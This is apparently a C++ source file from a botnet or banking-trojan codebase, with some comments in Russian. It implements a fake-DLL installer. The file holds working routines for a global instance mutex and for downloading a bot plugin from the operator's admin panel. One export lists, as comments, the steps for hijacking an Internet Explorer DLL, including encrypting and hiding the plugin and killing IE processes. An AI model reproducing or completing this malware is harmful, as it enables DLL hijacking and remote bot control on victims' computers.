
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"

#include "DbgRpt.h"
#include "Utils.h"

#include "BotSocket.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define FAKEDLLDBG LDRDEBGTEMPLATES::DBGOutMessage<>

PCHAR MakeMachineID();

bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
{
	CHAR mutex_name[200];

	m_memset(mutex_name, 0, sizeof(mutex_name));

	PCHAR machine_id = MakeMachineID();
	m_lstrcat(mutex_name, "Global\\");
	m_lstrcat(mutex_name, MutexPrefix);
	m_lstrcat(mutex_name, machine_id);

	STR::Free(machine_id);

	FAKEDLLDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);

	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;

	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
	if (mutex_handle == NULL) return false;

	// Catch ownership of mutex and never release
	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
	if (wait_result == WAIT_OBJECT_0) return true;

	pCloseHandle(mutex_handle);
	return false;
}

// Загружаем нужный ботплаг из админки.
// Необходимо чтобы это был плаг с параметрами для соединения с сервером.
LPVOID FakeDll_LoadBotPlug(PCHAR PlugName, DWORD * Size)
{
	LPVOID Module = NULL;

	FAKEDLLDBG("FakeDll_LoadBotPlug", "Started with PlugName='%s'", PlugName);

	//Загружаем указанный плагин
	Module = Plugin::DownloadEx(PlugName, NULL, Size, true, false, NULL);

	FAKEDLLDBG("FakeDll_LoadBotPlug", "DownloadEx result module=0x%u", Module);

	return Module;
}

BOOL WINAPI Export_InstallForIe(const void* SelfBody, DWORD SelfBodySize)
{
	do
	{
		// Check builtin FakeDll existing
		// Generate crypt key
		// Generate random path for bot.plug (User\AppData)
		// Download plug and encrypt it
		// Select target dll
		// Create new target name
		// Prepare fake dll (Insert crypt key, new target name, path to crypted botplug) 
		// Try to rename target dll
		// if not allowed - try to kill all IE processes and try rename again
		// if rename ok - save prepared fake dll
		// report result
	}
	while (false);
	return FALSE;
}

#pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )

DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
{
	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);

	return TRUE;
}

// Предназначена для внешнего запуска ф-ций тестирования 
void WINAPI Export_RunTests()
{
}

